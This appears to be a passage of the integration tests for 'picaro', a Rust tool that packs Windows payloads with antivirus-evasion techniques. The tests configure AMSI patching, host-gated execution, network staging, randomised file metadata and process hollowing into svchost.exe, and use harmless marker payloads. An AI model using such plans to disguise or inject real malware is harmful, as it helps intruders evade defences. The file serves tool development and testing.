//! Integration tests for the `picaro` CLI.

use std::path::{Path, PathBuf};
use std::process::Command;

#[test]
fn techniques_list_lists_all_techniques() {
    let output = Command::new(env!("CARGO_BIN_EXE_picaro"))
        .args(["techniques", "list"])
        .output()
        .expect("run picaro techniques list");

    assert!(output.status.success(), "list must exit 0");
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("process_hollowing"),
        "list output: {stdout}"
    );
    assert!(
        stdout.contains("reflective_loading"),
        "list output: {stdout}"
    );
}

#[test]
fn techniques_show_renders_readme_by_default() {
    let output = Command::new(env!("CARGO_BIN_EXE_picaro"))
        .args(["techniques", "show", "process_hollowing"])
        .output()
        .expect("run picaro techniques show");

    assert!(output.status.success(), "show must exit 0");
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("Process hollowing"),
        "show output: {stdout}"
    );
    assert!(stdout.contains("T1055"), "show output: {stdout}");
    // Stdout is captured (not a TTY), so the pager must not engage and the
    // styled page must not leak escape codes.
    assert!(!stdout.contains('\u{1b}'), "escapes leaked: {stdout:?}");
    assert!(
        !stdout.contains("## Metadata"),
        "the metadata header should supersede the raw section: {stdout}"
    );
}

#[test]
fn techniques_show_raw_prints_verbatim_readme() {
    let output = Command::new(env!("CARGO_BIN_EXE_picaro"))
        .args([
            "techniques",
            "show",
            "process_hollowing",
            "--raw",
            "--no-pager",
        ])
        .output()
        .expect("run picaro techniques show --raw");

    assert!(output.status.success(), "show --raw must exit 0");
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("# Process hollowing"),
        "raw output: {stdout}"
    );
}

/// End-to-end: `picaro build` with a Preparation + Execution pipeline
/// produces a PE. Marked `#[ignore]` because it compiles the stub (needs
/// `rustc` + the compiled dependencies).
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc and the compiled dependencies"]
fn build_with_amsi_patch_produces_pe() {
    let output = Command::new(env!("CARGO_BIN_EXE_picaro"))
        .args(["build", "tests/plans/amsi-patch.yaml"])
        .output()
        .expect("run picaro build");
    assert!(
        output.status.success(),
        "build failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let bytes = std::fs::read("dist/test_amsi_patch.exe").expect("read output");
    assert_eq!(&bytes[..2], b"MZ", "output must be a PE");
}

/// End-to-end: a Preparation-after-Execution pipeline fails validation with a
/// clear error. Marked `#[ignore]` to keep the fast suite hermetic (this one
/// needs no `rustc`, but it is grouped with the other e2e build checks).
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc and the compiled dependencies"]
fn build_with_invalid_order_fails() {
    let output = Command::new(env!("CARGO_BIN_EXE_picaro"))
        .args(["build", "tests/plans/invalid-order.yaml"])
        .output()
        .expect("run picaro build");
    assert!(!output.status.success(), "invalid order must fail");
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("does not return control"),
        "unclear error: {stderr}"
    );
}

/// The banner (and its tagline) is printed before every subcommand.
#[test]
fn banner_is_printed_by_default() {
    let output = Command::new(env!("CARGO_BIN_EXE_picaro"))
        .args(["techniques", "list"])
        .output()
        .expect("run picaro techniques list");

    assert!(output.status.success(), "list must exit 0");
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("Declarative evasion for Windows payloads"),
        "banner missing: {stdout}"
    );
}

/// `--quiet` suppresses the banner but keeps the command output.
#[test]
fn quiet_flag_hides_the_banner() {
    let output = Command::new(env!("CARGO_BIN_EXE_picaro"))
        .args(["--quiet", "techniques", "list"])
        .output()
        .expect("run picaro --quiet techniques list");

    assert!(output.status.success(), "list must exit 0");
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        !stdout.contains("Declarative evasion for Windows payloads"),
        "banner not suppressed: {stdout}"
    );
    assert!(
        stdout.contains("process_hollowing"),
        "output missing: {stdout}"
    );
}

/// End-to-end: a `bouncer` Preparation + `reflective_loading` pipeline compiles
/// to a PE. Marked `#[ignore]` because it compiles the stub.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc and the compiled dependencies"]
fn build_with_bouncer_produces_pe() {
    let output = Command::new(env!("CARGO_BIN_EXE_picaro"))
        .args(["build", "tests/plans/bouncer.yaml"])
        .output()
        .expect("run picaro build");
    assert!(
        output.status.success(),
        "build failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let bytes = std::fs::read("dist/test_bouncer.exe").expect("read output");
    assert_eq!(&bytes[..2], b"MZ", "output must be a PE");
}

/// End-to-end (Windows): the `bouncer` gate rejects a host whose name does not
/// match and lets a matching host run the payload.
///
/// The payload prints `PAYLOAD_MARKER_7f3a9c2e` to stdout, so the presence or
/// absence of that line tells whether the gate worked. Marked `#[ignore]`
/// because it compiles two stubs and needs a Windows host.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
fn bouncer_gate_blocks_and_allows_on_windows() {
    if !cfg!(windows) {
        return;
    }

    // Build the plan and run the packed binary, returning its stdout.
    let run = |plan: &str, exe: &str| -> String {
        let build = Command::new(env!("CARGO_BIN_EXE_picaro"))
            .args(["build", plan])
            .output()
            .expect("run picaro build");
        assert!(
            build.status.success(),
            "build {plan} failed: {}",
            String::from_utf8_lossy(&build.stderr)
        );
        let packed = Command::new(exe).output().expect("run the packed exe");
        String::from_utf8_lossy(&packed.stdout).into_owned()
    };

    const MARKER: &str = "PAYLOAD_MARKER_7f3a9c2e";

    let miss = run(
        "tests/plans/bouncer-miss.yaml",
        "dist/test_bouncer_miss.exe",
    );
    assert!(
        !miss.contains(MARKER),
        "the payload ran even though the host name did not match: {miss}"
    );

    let hit = run("tests/plans/bouncer.yaml", "dist/test_bouncer.exe");
    assert!(
        hit.contains(MARKER),
        "the payload did not run on a matching host: {hit}"
    );
}

/// End-to-end: `picaro build` with a custom loader stub produces a PE.
/// Marked `#[ignore]` because it compiles the stub.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc and the compiled dependencies"]
fn build_with_custom_stub_produces_pe() {
    let output = Command::new(env!("CARGO_BIN_EXE_picaro"))
        .args(["build", "examples/plans/custom-stub.yaml"])
        .output()
        .expect("run picaro build");
    assert!(
        output.status.success(),
        "build failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let bytes = std::fs::read("dist/test_custom_stub.exe").expect("read output");
    assert_eq!(&bytes[..2], b"MZ", "output must be a PE");
}

/// `build interactive` reads its answers from stdin. Choosing `quit` at the
/// review screen must write nothing and exit cleanly — no `rustc` needed, so
/// the test runs in the fast suite.
#[test]
fn build_interactive_quit_writes_nothing() {
    use std::io::Write;
    use std::process::Stdio;

    let plan_out = std::env::temp_dir().join("picaro_wizard_cli_quit.yaml");
    let _ = std::fs::remove_file(&plan_out);

    let mut child = Command::new(env!("CARGO_BIN_EXE_picaro"))
        .args(["build", "interactive", "examples/payloads/test_payload.exe"])
        .arg("--plan-out")
        .arg(&plan_out)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn picaro build interactive");

    // Four blanks for the payload (name, args, arch, output kind) and two for
    // the stub (strings, syscalls); add one reflective step and take the default
    // `patch_exit`; three blanks for the output (path, strip, trim paths). `3`
    // quits the review screen, so the wizard stops before writing (or compiling)
    // anything.
    let mut stdin = child.stdin.take().expect("stdin is piped");
    stdin.write_all(&b"\n".repeat(6)).expect("write answers");
    stdin
        .write_all(b"add a step\nreflective_loading\n\ndone\n")
        .expect("write the runtime chain");
    stdin
        .write_all(&b"\n".repeat(3))
        .expect("write output answers");
    stdin.write_all(b"3\n").expect("write the quit choice");
    drop(stdin);

    let output = child.wait_with_output().expect("wait for picaro");
    assert!(
        output.status.success(),
        "wizard failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(!plan_out.exists(), "the quit plan must not be written");
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("build interactive"),
        "no command echo: {stdout}"
    );
}

// --- payload runtime arguments ---

/// Compiles `examples/payloads/test_args_payload.rs` and returns the exe path.
#[cfg(feature = "live-tests")]
fn build_args_payload() -> PathBuf {
    // Two tests build this payload at the same time, and rustc derives its
    // intermediate object names from the output stem: a shared name makes the
    // parallel runs clobber each other's objects.
    static SEQ: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
    let seq = SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    let src = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("examples")
        .join("payloads")
        .join("test_args_payload.rs");
    let out = std::env::temp_dir().join(format!(
        "picaro_args_payload_{}_{seq}.exe",
        std::process::id()
    ));
    let status = Command::new("rustc")
        .arg(&src)
        .arg("-O")
        .arg("-C")
        .arg("strip=symbols")
        .arg("-o")
        .arg(&out)
        .status()
        .expect("run rustc to build the args test payload");
    assert!(status.success(), "rustc failed to build the test payload");
    out
}

/// Packs `payload` with reflective loading, `args` and `mode`, and returns the
/// packed exe path (relative to the crate root, where `cargo test` runs).
#[cfg(feature = "live-tests")]
fn pack_args_payload(name: &str, payload: &Path, args: &[&str], mode: &str) -> PathBuf {
    let yaml_args = args
        .iter()
        .map(|arg| format!("      - \"{arg}\"\n"))
        .collect::<String>();
    let source = payload.display().to_string().replace('\\', "/");
    let plan = format!(
        r#"schema: 6
name: {name}
build:
  crypto:
    algo: xchacha20poly1305
    key: random
  payloads:
    payload:
      source: "{source}"
      args:
{yaml_args}      args_mode: {mode}
  output:
    path: ./dist/{name}.exe
    arch: x64
    strip: true
    trim_paths: all
runtime:
  - technique: reflective_loading
    params: {{ payload: payload }}
"#
    );

    let plan_path = std::env::temp_dir().join(format!("picaro_args_{name}.yaml"));
    std::fs::write(&plan_path, plan).expect("write the temp plan");

    let output = Command::new(env!("CARGO_BIN_EXE_picaro"))
        .args(["build", plan_path.to_str().expect("utf-8 plan path")])
        .output()
        .expect("run picaro build");
    assert!(
        output.status.success(),
        "build failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    PathBuf::from(format!("dist/{name}.exe"))
}

/// Extracts the payload's `argv` from its `ARGS_BEGIN`/`ARGS_END` stdout block.
#[cfg(feature = "live-tests")]
fn payload_argv(stdout: &[u8]) -> Vec<String> {
    let text = String::from_utf8_lossy(stdout);
    let mut argv = Vec::new();
    let mut inside = false;
    for line in text.lines() {
        match line {
            "ARGS_BEGIN" => inside = true,
            "ARGS_END" => break,
            _ if inside => argv.push(line.to_string()),
            _ => {}
        }
    }
    assert!(!argv.is_empty(), "the payload printed no argv:\n{text}");
    argv
}

/// Runs the packed binary with `args` and returns its parsed payload `argv`.
#[cfg(feature = "live-tests")]
fn run_packed(exe: &Path, args: &[&str]) -> Vec<String> {
    let output = Command::new(exe)
        .args(args)
        .output()
        .expect("run the packed binary");
    assert!(
        output.status.success(),
        "packed run failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    payload_argv(&output.stdout)
}

/// End-to-end: with `args_mode: join`, the payload receives the YAML args
/// followed by the runtime args. `argv[0]` is the executable name.
/// `#[ignore]`: needs `rustc` and the compiled dependencies.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc and the compiled dependencies"]
fn payload_receives_yaml_then_runtime_args() {
    let payload = build_args_payload();
    let exe = pack_args_payload("test_args_join", &payload, &["yaml-a", "yaml-b"], "join");

    let argv = run_packed(&exe, &["runtime-c", "runtime-d"]);
    assert_eq!(argv.len(), 5, "argv: {argv:?}");
    assert_eq!(&argv[1..], &["yaml-a", "yaml-b", "runtime-c", "runtime-d"]);

    // With no runtime args the payload still gets the YAML ones.
    let argv = run_packed(&exe, &[]);
    assert_eq!(&argv[1..], &["yaml-a", "yaml-b"]);
}

/// End-to-end: with `args_mode: override`, the runtime args replace the YAML
/// ones when present, and the YAML args are used when there are none.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc and the compiled dependencies"]
fn payload_override_mode_prefers_runtime_args() {
    let payload = build_args_payload();
    let exe = pack_args_payload(
        "test_args_override",
        &payload,
        &["yaml-a", "yaml-b"],
        "override",
    );

    let argv = run_packed(&exe, &["runtime-c"]);
    assert_eq!(&argv[1..], &["runtime-c"]);

    let argv = run_packed(&exe, &[]);
    assert_eq!(&argv[1..], &["yaml-a", "yaml-b"]);
}

// --- audit --json / --baseline ---

/// A checked-in x64 PE used by the hermetic audit tests.
const AUDIT_FIXTURE: &str = "tests/fixtures/minimal_x64.exe";

/// Runs `picaro` with `args` and returns the output.
fn picaro(args: &[&std::ffi::OsStr]) -> std::process::Output {
    Command::new(env!("CARGO_BIN_EXE_picaro"))
        .args(args)
        .output()
        .expect("run picaro")
}

/// `audit --json` emits a JSON report whose top level is the report itself.
#[test]
fn audit_json_emits_a_machine_readable_report() {
    let out = picaro(&[
        "--quiet".as_ref(),
        "audit".as_ref(),
        AUDIT_FIXTURE.as_ref(),
        "--json".as_ref(),
    ]);
    assert!(
        out.status.success(),
        "audit --json failed: {}",
        String::from_utf8_lossy(&out.stderr)
    );

    let report: serde_json::Value =
        serde_json::from_slice(&out.stdout).expect("stdout must be valid JSON");
    assert_eq!(report["report_schema"], 1, "report: {report}");
    assert!(
        report["sections"].as_array().is_some_and(|s| !s.is_empty()),
        "the report must list sections"
    );
    assert!(
        report.get("baseline").is_none(),
        "no baseline was given, so none must be emitted"
    );
}

/// `audit` writes its JSON to a file and compares a later run against it: the
/// same binary is clean, a forced entropy jump exits 3.
#[test]
fn audit_baseline_gates_a_regression() {
    let json = picaro(&[
        "--quiet".as_ref(),
        "audit".as_ref(),
        AUDIT_FIXTURE.as_ref(),
        "--json".as_ref(),
    ]);
    assert!(json.status.success());

    let baseline = std::env::temp_dir().join("picaro_cli_baseline.json");
    std::fs::write(&baseline, &json.stdout).expect("write the baseline");

    // The same binary must not regress against its own report.
    let clean = picaro(&[
        "--quiet".as_ref(),
        "audit".as_ref(),
        AUDIT_FIXTURE.as_ref(),
        "--baseline".as_ref(),
        baseline.as_os_str(),
    ]);
    assert!(
        clean.status.success(),
        "a self-baseline must pass: {}",
        String::from_utf8_lossy(&clean.stdout)
    );
    assert!(String::from_utf8_lossy(&clean.stdout).contains("no regressions"));

    // Fake an entropy regression in the baseline, then it must fail with exit 3.
    let mut report: serde_json::Value = serde_json::from_slice(&json.stdout).expect("valid JSON");
    report["sections"][0]["entropy"] = serde_json::json!(0.0);
    std::fs::write(&baseline, serde_json::to_vec(&report).unwrap()).expect("rewrite baseline");

    let regressed = picaro(&[
        "--quiet".as_ref(),
        "audit".as_ref(),
        AUDIT_FIXTURE.as_ref(),
        "--baseline".as_ref(),
        baseline.as_os_str(),
    ]);
    assert_eq!(
        regressed.status.code(),
        Some(3),
        "a regression must exit 3: {}",
        String::from_utf8_lossy(&regressed.stdout)
    );
    assert!(String::from_utf8_lossy(&regressed.stdout).contains("regression"));
}

// --- build --dry-run / build.payloads.<name>.sha256 ---

/// A minimal build plan (reflective loading, builtin stub) for `out`.
fn minimal_build_plan(out: &Path, sha256: Option<&str>) -> String {
    let sha_line = match sha256 {
        Some(hash) => format!("      sha256: \"{hash}\"\n"),
        None => String::new(),
    };
    let out = out.display().to_string().replace('\\', "/");
    format!(
        r#"schema: 6
name: cli-dry-run
build:
  crypto:
    algo: xchacha20poly1305
    key: random
  payloads:
    payload:
      source: examples/payloads/test_payload.exe
{sha_line}  output:
    path: "{out}"
    arch: x64
    strip: true
    trim_paths: all
runtime:
  - technique: reflective_loading
    params: {{ payload: payload }}
"#
    )
}

fn write_temp_plan(name: &str, body: &str) -> PathBuf {
    let path = std::env::temp_dir().join(name);
    std::fs::write(&path, body).expect("write the temp plan");
    path
}

/// `build --dry-run` validates the plan and payload but writes nothing — and
/// therefore needs no `rustc`, so it runs in the fast suite. Nothing means
/// nothing: neither the delivered artifact nor a bundle.
#[test]
fn build_dry_run_validates_without_writing() {
    let out = std::env::temp_dir().join("picaro_dry_run_out.exe");
    let _ = std::fs::remove_file(&out);
    // This test owns the `cli-dry-run-only` plan name, so no other test can add
    // a bundle under it while the before/after sweep runs.
    let yaml =
        minimal_build_plan(&out, None).replace("name: cli-dry-run", "name: cli-dry-run-only");
    let before = bundles_for("cli-dry-run-only-");

    let plan = write_temp_plan("picaro_dry_run.yaml", &yaml);
    let output = picaro(&[
        "--quiet".as_ref(),
        "build".as_ref(),
        plan.as_os_str(),
        "--dry-run".as_ref(),
    ]);

    assert!(
        output.status.success(),
        "dry run failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(String::from_utf8_lossy(&output.stdout).contains("dry run"));
    assert!(!out.exists(), "a dry run must not write the artifact");
    assert_eq!(
        bundles_for("cli-dry-run-only-"),
        before,
        "a dry run must not create a bundle"
    );
}

/// The build bundles under `packed/` whose name starts with `prefix`.
fn bundles_for(prefix: &str) -> Vec<std::path::PathBuf> {
    let mut found: Vec<_> = std::fs::read_dir("packed")
        .map(|entries| {
            entries
                .filter_map(|entry| entry.ok())
                .map(|entry| entry.path())
                .filter(|path| {
                    path.file_name()
                        .and_then(|name| name.to_str())
                        .is_some_and(|name| name.starts_with(prefix))
                })
                .collect()
        })
        .unwrap_or_default();
    found.sort();
    found
}

/// A `kind: dll` build whose export name is a Rust keyword is rejected by the
/// plan validator before anything is compiled (dry run, no `rustc`).
#[test]
fn build_rejects_a_keyword_export_name() {
    let out = std::env::temp_dir().join("picaro_keyword_export.dll");
    let out = out.display().to_string().replace('\\', "/");
    let plan = write_temp_plan(
        "picaro_keyword_export.yaml",
        &format!(
            r#"schema: 6
name: cli-keyword-export
build:
  crypto:
    algo: xchacha20poly1305
    key: random
  payloads:
    payload:
      source: examples/payloads/test_payload.exe
  output:
    path: "{out}"
    kind: dll
    entry: export:fn
runtime:
  - technique: reflective_loading
    params: {{ payload: payload }}
"#
        ),
    );

    let output = picaro(&[
        "--quiet".as_ref(),
        "build".as_ref(),
        plan.as_os_str(),
        "--dry-run".as_ref(),
    ]);
    assert!(!output.status.success(), "a keyword export must fail");
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("Rust keyword"), "unclear error: {stderr}");
}

/// A `build.payloads.<name>.sha256` that does not match the payload aborts the build
/// with a clear message, before anything is compiled.
#[test]
fn build_rejects_a_payload_sha256_mismatch() {
    let out = std::env::temp_dir().join("picaro_sha_out.exe");
    let wrong = "0".repeat(64);
    let plan = write_temp_plan(
        "picaro_sha_mismatch.yaml",
        &minimal_build_plan(&out, Some(&wrong)),
    );

    let output = picaro(&["--quiet".as_ref(), "build".as_ref(), plan.as_os_str()]);
    assert!(!output.status.success(), "a mismatch must fail");
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("sha256 mismatch"),
        "unclear error: {stderr}"
    );
    assert!(!out.exists(), "nothing must be written on a mismatch");
}

// --- output.resources (icon / version info / manifest) ---

/// `build --dry-run` validates the resources (icon parsing, version strings and
/// manifest) without compiling, so it runs in the fast suite.
#[test]
fn build_dry_run_validates_resources() {
    let output = picaro(&[
        "--quiet".as_ref(),
        "build".as_ref(),
        "tests/plans/resources.yaml".as_ref(),
        "--dry-run".as_ref(),
    ]);
    assert!(
        output.status.success(),
        "resource dry run failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("icon"), "resources not shown: {stdout}");
    assert!(
        stdout.contains("resources"),
        "resources not shown: {stdout}"
    );
}

/// The shipped `hooks.sleep` example validates as-is (dry run, no `rustc`).
#[test]
fn build_dry_run_accepts_the_sleep_hook_example() {
    let output = picaro(&[
        "--quiet".as_ref(),
        "build".as_ref(),
        "examples/plans/sleep-hook.yaml".as_ref(),
        "--dry-run".as_ref(),
    ]);
    assert!(
        output.status.success(),
        "the sleep-hook example does not validate: {}",
        String::from_utf8_lossy(&output.stderr)
    );
}

/// `icon: random` is generated during `--dry-run` (no `rustc` needed), so the
/// generator runs hermetically.
#[test]
fn build_dry_run_generates_a_random_icon() {
    let output = picaro(&[
        "--quiet".as_ref(),
        "build".as_ref(),
        "tests/plans/resources-random-icon.yaml".as_ref(),
        "--dry-run".as_ref(),
    ]);
    assert!(
        output.status.success(),
        "random-icon dry run failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("icon random"), "not shown: {stdout}");
}

// --- network_stager ---

/// A staged payload is fetched at run time, so `--dry-run` must not read its
/// `source` (here an unreachable URL) — the build skips it too.
#[test]
fn build_dry_run_does_not_fetch_a_staged_payload() {
    let output = picaro(&[
        "--quiet".as_ref(),
        "build".as_ref(),
        "tests/plans/network-stager-dry-run.yaml".as_ref(),
        "--dry-run".as_ref(),
    ]);
    assert!(
        output.status.success(),
        "a staged payload must not be fetched by the dry run: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("staged"), "not shown: {stdout}");
}

/// End-to-end: a plan with icon + version info + manifest embeds a `.rsrc`
/// section, which `audit --json` reports. Marked `#[ignore]` (compiles a stub).
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc and the compiled dependencies"]
fn build_with_resources_embeds_a_resource_section() {
    let build = picaro(&["build".as_ref(), "tests/plans/resources.yaml".as_ref()]);
    assert!(
        build.status.success(),
        "build failed: {}",
        String::from_utf8_lossy(&build.stderr)
    );

    let audit = picaro(&[
        "--quiet".as_ref(),
        "audit".as_ref(),
        "dist/test_resources.exe".as_ref(),
        "--json".as_ref(),
    ]);
    assert!(audit.status.success(), "audit failed");
    let report: serde_json::Value = serde_json::from_slice(&audit.stdout).expect("valid JSON");
    assert_eq!(
        report["has_manifest"], true,
        "no manifest resource: {report}"
    );
    assert_eq!(
        report["has_manifest"], true,
        "no manifest resource: {report}"
    );
    assert!(
        report["sections"]
            .as_array()
            .is_some_and(|s| s.iter().any(|s| s["name"] == ".rsrc")),
        "no .rsrc section: {report}"
    );
}

// --- output.sign / output.subsystem ---

/// A `sign.file` that does not exist is caught by `--dry-run` (no `signtool`
/// needed for this path, so the test is hermetic).
#[test]
fn build_dry_run_rejects_a_missing_signing_file() {
    let out = std::env::temp_dir().join("picaro_sign_out.exe");
    let yaml = minimal_build_plan(&out, None).replace(
        "    trim_paths: all\n",
        "    trim_paths: all\n    sign:\n      mode: file\n      file: ./does-not-exist.pfx\n",
    );
    let plan = write_temp_plan("picaro_sign_missing.yaml", &yaml);

    let output = picaro(&[
        "--quiet".as_ref(),
        "build".as_ref(),
        plan.as_os_str(),
        "--dry-run".as_ref(),
    ]);
    assert!(!output.status.success(), "a missing .pfx must fail");
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("does not exist"), "unclear error: {stderr}");
}

/// An unknown `sign.mode` is rejected before anything runs.
#[test]
fn build_rejects_an_unknown_signing_mode() {
    let out = std::env::temp_dir().join("picaro_sign_mode_out.exe");
    let yaml = minimal_build_plan(&out, None).replace(
        "    trim_paths: all\n",
        "    trim_paths: all\n    sign:\n      mode: bogus\n",
    );
    let plan = write_temp_plan("picaro_sign_mode.yaml", &yaml);

    let output = picaro(&[
        "--quiet".as_ref(),
        "build".as_ref(),
        plan.as_os_str(),
        "--dry-run".as_ref(),
    ]);
    assert!(!output.status.success());
    assert!(
        String::from_utf8_lossy(&output.stderr).contains("output.sign.mode"),
        "unclear error: {}",
        String::from_utf8_lossy(&output.stderr)
    );
}

/// `version_info.randomize` is resolved during `--dry-run` (no `rustc` or
/// `signtool` needed), so the generated metadata is exercised hermetically.
#[test]
fn build_dry_run_resolves_randomized_metadata() {
    let out = std::env::temp_dir().join("picaro_random_out.exe");
    let yaml = minimal_build_plan(&out, None).replace(
        "    trim_paths: all\n",
        "    trim_paths: all\n    resources:\n      version_info:\n        randomize: true\n",
    );
    let plan = write_temp_plan("picaro_random.yaml", &yaml);

    let output = picaro(&[
        "--quiet".as_ref(),
        "build".as_ref(),
        plan.as_os_str(),
        "--dry-run".as_ref(),
    ]);
    assert!(
        output.status.success(),
        "randomized dry run failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(String::from_utf8_lossy(&output.stdout).contains("resources"));
}

// --- x86 (M1) ---

/// The `i686` rustc triple for the host's ABI: the stub and the payload share it.
#[cfg(feature = "live-tests")]
fn x86_target() -> &'static str {
    if cfg!(target_env = "msvc") {
        "i686-pc-windows-msvc"
    } else {
        "i686-pc-windows-gnu"
    }
}

/// End-to-end x86: a 32-bit payload packed with `reflective_loading` is mapped
/// into the (32-bit) stub and prints its marker.
///
/// `#[ignore]`: needs `rustc`, the `i686` target installed and the workspace
/// built for it (`cargo build --target i686-pc-windows-msvc`), plus a Windows
/// host to run the artifact (under WOW64 on an x64 one).
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc, the i686 target and a Windows host"]
fn packs_and_runs_an_x86_reflective_payload() {
    if !cfg!(windows) {
        return;
    }

    // 1. Build the 32-bit payload.
    let src = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("examples")
        .join("payloads")
        .join("test_payload.rs");
    let payload =
        std::env::temp_dir().join(format!("picaro_x86_payload_{}.exe", std::process::id()));
    let status = Command::new("rustc")
        .arg(&src)
        .arg("--target")
        .arg(x86_target())
        .args(["-O", "-C", "strip=symbols", "-o"])
        .arg(&payload)
        .status()
        .expect("run rustc to build the 32-bit payload");
    assert!(status.success(), "the 32-bit payload must compile");

    // 2. Pack it with `arch: x86`.
    let source = payload.display().to_string().replace('\\', "/");
    let plan = format!(
        r#"schema: 6
name: x86_reflective
build:
  crypto:
    algo: xchacha20poly1305
    key: random
  payloads:
    payload:
      source: "{source}"
  output:
    path: ./dist/x86_reflective.exe
    arch: x86
    strip: true
    trim_paths: all
runtime:
  - technique: reflective_loading
    params: {{ payload: payload }}
"#
    );
    let plan_path = std::env::temp_dir().join(format!("picaro_x86_{}.yaml", std::process::id()));
    std::fs::write(&plan_path, plan).expect("write the temp plan");

    let output = Command::new(env!("CARGO_BIN_EXE_picaro"))
        .args(["build", plan_path.to_str().expect("utf-8 plan path")])
        .output()
        .expect("run picaro build");
    assert!(
        output.status.success(),
        "x86 build failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    // 3. The artifact must be a 32-bit PE...
    let artifact = Path::new("dist/x86_reflective.exe");
    let bytes = std::fs::read(artifact).expect("read the artifact");
    let e_lfanew =
        u32::from_le_bytes([bytes[0x3C], bytes[0x3D], bytes[0x3E], bytes[0x3F]]) as usize;
    let machine = u16::from_le_bytes([bytes[e_lfanew + 4], bytes[e_lfanew + 5]]);
    assert_eq!(machine, 0x014c, "the artifact must be a 32-bit PE");

    // 4. ...and run the payload: the marker comes from the mapped image.
    let run = Command::new(artifact)
        .output()
        .expect("run the packed x86 binary");
    let stdout = String::from_utf8_lossy(&run.stdout);
    assert!(
        stdout.contains("PAYLOAD_MARKER_7f3a9c2e"),
        "the payload did not run: status={:?} stdout={stdout} stderr={}",
        run.status,
        String::from_utf8_lossy(&run.stderr)
    );
}

// --- process hollowing (x64 + x86) ---

/// Compiles `examples/payloads/test_hollow_payload.rs` for `target` (`None` for
/// the host) and returns the payload path.
#[cfg(feature = "live-tests")]
fn build_hollow_payload(target: Option<&str>) -> PathBuf {
    let src = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("examples")
        .join("payloads")
        .join("test_hollow_payload.rs");
    let suffix = target.unwrap_or("host");
    let out = std::env::temp_dir().join(format!(
        "picaro_hollow_payload_{suffix}_{}.exe",
        std::process::id()
    ));
    let mut command = Command::new("rustc");
    command.arg(&src);
    if let Some(target) = target {
        command.arg("--target").arg(target);
    }
    let status = command
        .args(["-O", "-C", "strip=symbols", "-o"])
        .arg(&out)
        .status()
        .expect("run rustc to build the hollowing payload");
    assert!(status.success(), "the hollowing payload must compile");
    out
}

/// Packs `payload` with `process_hollowing` for `arch` and returns the artifact.
#[cfg(feature = "live-tests")]
fn pack_hollowing_payload(name: &str, payload: &Path, arch: &str) -> PathBuf {
    let source = payload.display().to_string().replace('\\', "/");
    let plan = format!(
        r#"schema: 6
name: {name}
build:
  crypto:
    algo: xchacha20poly1305
    key: random
  payloads:
    payload:
      source: "{source}"
      args:
        - "dist/{name}.marker"
  output:
    path: ./dist/{name}.exe
    arch: {arch}
    strip: true
    trim_paths: all
runtime:
  - technique: process_hollowing
    params:
      payload: payload
      target: "C:\\Windows\\System32\\svchost.exe"
"#
    );
    let plan_path = std::env::temp_dir().join(format!("picaro_{name}.yaml"));
    std::fs::write(&plan_path, plan).expect("write the temp plan");

    let output = Command::new(env!("CARGO_BIN_EXE_picaro"))
        .args(["build", plan_path.to_str().expect("utf-8 plan path")])
        .output()
        .expect("run picaro build");
    assert!(
        output.status.success(),
        "hollowing build failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    PathBuf::from(format!("dist/{name}.exe"))
}

/// Runs a packed hollowing artifact and asserts that the payload ran inside the
/// target: the marker file (written by the hollowed process, which has no
/// console) carries the payload's own `thread_local` value, and the stub relays
/// the payload's exit code.
#[cfg(feature = "live-tests")]
fn assert_hollowed_run(artifact: &Path, name: &str) {
    let marker = PathBuf::from(format!("dist/{name}.marker"));
    let _ = std::fs::remove_file(&marker);

    let run = Command::new(artifact)
        .output()
        .expect("run the packed hollowing binary");
    let stdout = String::from_utf8_lossy(&run.stdout);
    assert_eq!(
        run.status.code(),
        Some(42),
        "the stub must relay the payload's exit code: stdout={stdout} stderr={}",
        String::from_utf8_lossy(&run.stderr)
    );

    let written = std::fs::read_to_string(&marker)
        .unwrap_or_else(|e| panic!("the hollowed payload wrote no marker ({e})"));
    assert!(
        written.contains("PAYLOAD_MARKER_7f3a9c2e"),
        "the hollowed payload did not run: {written}"
    );
